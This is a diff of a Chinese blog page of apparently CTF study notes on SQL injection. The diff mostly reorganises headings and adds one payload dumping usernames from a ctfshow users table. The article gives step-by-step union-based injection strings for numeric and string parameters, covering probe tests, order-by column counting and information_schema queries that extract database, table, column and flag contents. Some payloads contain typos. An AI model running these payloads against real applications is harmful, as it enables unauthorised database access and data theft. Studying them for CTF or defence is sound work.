@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="sql手动注入语法, 更好的明天">
+    <meta name="keywords" content="sql注入漏洞, 更好的明天">
     <meta name="description" content="打ACM和CTF，未来的人上人，嘿嘿">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>sql手动注入语法 | 更好的明天</title>
+    <title>sql注入漏洞 | 更好的明天</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">sql手动注入语法</h1>
+                    <h1 class="description center-align post-title">sql注入漏洞</h1>
                 </div>
             </div>
         </div>
@@ -511,66 +511,71 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="对information-shcema的理解"><a href="#对information-shcema的理解" class="headerlink" title="对information_shcema的理解"></a>对information_shcema的理解</h1><ol>
+                <h1 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h1><h2 id="对information-shcema的理解"><a href="#对information-shcema的理解" class="headerlink" title="对information_shcema的理解"></a>对information_shcema的理解</h2><ol>
 <li>shcema可以看作是房间</li>
 <li>table_schema是用来存放table表的房间，是数据库</li>
 <li>table_name是表的名字</li>
 <li>table_type是表的类型</li>
 </ol>
-<h1 id="对group-concat和concat-ws的理解"><a href="#对group-concat和concat-ws的理解" class="headerlink" title="对group_concat和concat_ws的理解"></a>对group_concat和concat_ws的理解</h1><ol>
+<h2 id="对group-concat和concat-ws的理解"><a href="#对group-concat和concat-ws的理解" class="headerlink" title="对group_concat和concat_ws的理解"></a>对group_concat和concat_ws的理解</h2><ol>
 <li>group_concat可以将多行数据整合为一行</li>
 <li>concat可以将不同数据用第一个参数链接</li>
 <li>可以写group_concat(concat_ws(‘:’,id,email_id))</li>
 </ol>
-<h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><h2 id="判断是否有注入点"><a href="#判断是否有注入点" class="headerlink" title="判断是否有注入点"></a>判断是否有注入点</h2><ol>
+<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><h3 id="判断是否有注入点"><a href="#判断是否有注入点" class="headerlink" title="判断是否有注入点"></a>判断是否有注入点</h3><ol>
 <li>1 and 1=1正确</li>
-<li>1 and 1=2不正确，所以可以判断是整数型注入<h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2></li>
+<li>1 and 1=2不正确，所以可以判断是整数型注入</li>
+</ol>
+<h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><ol>
 <li>order by 1,2,3,4….</li>
 <li>可以使用二分法来判断</li>
 <li>为下一步联合查询爆数据库名奠定基础</li>
 </ol>
-<h2 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><ol>
+<h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><ol>
 <li>?id=1 and 1=2 union select 1.database()</li>
 <li>注意此处联合查询需要前后字段数量一致，且字段数与上一步使用order by 判断的一致</li>
 <li><a target="_blank" rel="noopener" href="https://imgtu.com/i/HgvkKf"><img src="https://s4.ax1x.com/2022/02/15/HgvkKf.md.png" alt="HgvkKf.md.png"></a></li>
 </ol>
-<h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><ol>
+<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><ol>
 <li>?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_name= ‘sqli’</li>
 <li>group_concat()函数是用来将多行转为一行，将组中的字符串连接成为具有各种选项的单个字符串</li>
 <li>table_name</li>
 <li>information_schema.tables</li>
+<li>1’ and 1=2 union select 1,2,group_concat(username) from ctfshow_web.ctfshow_users where id=1  –+</li>
 </ol>
-<h2 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h2><ol>
+<h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><ol>
 <li>?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=’flag’</li>
 <li>column_name</li>
 <li>information_schema.columns</li>
 <li>table_name</li>
 </ol>
-<h2 id="查询flag"><a href="#查询flag" class="headerlink" title="查询flag"></a>查询flag</h2><ol>
+<h3 id="查询flag"><a href="#查询flag" class="headerlink" title="查询flag"></a>查询flag</h3><ol>
 <li>?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag</li>
 <li>根据库中的表来查询所有的列中带flag的</li>
 <li><a target="_blank" rel="noopener" href="https://imgtu.com/i/HgvAr8"><img src="https://s4.ax1x.com/2022/02/15/HgvAr8.md.png" alt="HgvAr8.md.png"></a></li>
 </ol>
-<h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h1><h2 id="判断能否根据输入的不同结果不同"><a href="#判断能否根据输入的不同结果不同" class="headerlink" title="判断能否根据输入的不同结果不同"></a>判断能否根据输入的不同结果不同</h2><ol>
-<li>输入1，2，3…看是否有不同的数据<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2></li>
+<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><h3 id="判断能否根据输入的不同结果不同"><a href="#判断能否根据输入的不同结果不同" class="headerlink" title="判断能否根据输入的不同结果不同"></a>判断能否根据输入的不同结果不同</h3><ol>
+<li>输入1，2，3…看是否有不同的数据</li>
+</ol>
+<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><ol>
 <li>1 and 1=1;和1 and 1=2都没错</li>
 <li>1’ and 1=1 –+ 没有问题</li>
 <li>1’ and 1=2 –+报错</li>
 <li>报错是爆出语法错误</li>
 <li>后面加上–+是为了产生闭合，屏蔽掉后面的多余单引号</li>
 </ol>
-<h2 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h2><ol>
+<h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><ol>
 <li>?id=1’ order by 2 没问题</li>
 <li>?id=1’ order by 3 有问题</li>
 </ol>
-<h2 id="爆数据库名-1"><a href="#爆数据库名-1" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><ol>
+<h3 id="爆数据库名-1"><a href="#爆数据库名-1" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><ol>
 <li>?id=1’ and 1=2 union select 1,database() –+</li>
 <li>得到数据库名为sqli</li>
 </ol>
-<h2 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h2><ol>
+<h3 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h3><ol>
 <li>?id=1’ and 1=2 union select 1,group_concat(concat_ws(‘:’,table_name)) from information_schema.tables where table_name=’flag’ –+</li>
 </ol>
-<h2 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h2><ol>
+<h3 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h3><ol>
 <li>?id=1’ and 1=2 union select 1,group_conat(concat_ws(‘:’,flag)) from sqli.flag</li>
 <li><a target="_blank" rel="noopener" href="https://imgtu.com/i/H2sSTH"><img src="https://s4.ax1x.com/2022/02/15/H2sSTH.md.png" alt="H2sSTH.md.png"></a></li>
 </ol>
@@ -1395,7 +1400,7 @@ left((select database()),1)&#x3D;‘s’ 同样的意思
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">142.1k</span>&nbsp;字
+                class="white-color">143.8k</span>&nbsp;字
             
             
             
